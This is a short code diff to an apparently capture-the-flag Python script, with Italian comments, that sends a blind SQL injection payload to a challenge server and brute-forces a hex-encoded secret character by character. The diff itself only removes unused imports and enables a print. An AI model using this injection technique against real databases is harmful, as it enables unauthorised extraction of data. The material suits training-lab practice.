@@ -1,6 +1,4 @@
 import requests
-import binascii
-import time
 
 
 class Inj:
@@ -46,7 +44,7 @@ inj = Inj('http://web-17.challs.olicyber.it')
 # codifico la parola secret in hex per ridurre i caratteri da testare 0-F
 # chiedo se il primo carattere è uno 0(failure), ma è un 5(success)
 response, error = inj.blind("1' AND (SELECT 1 WHERE HEX('SECRET') LIKE '5%')='1")
-#print(response)
+print(response)
 
 # script to brute force the flag iterating over the dictionary
 print("Starting script...")
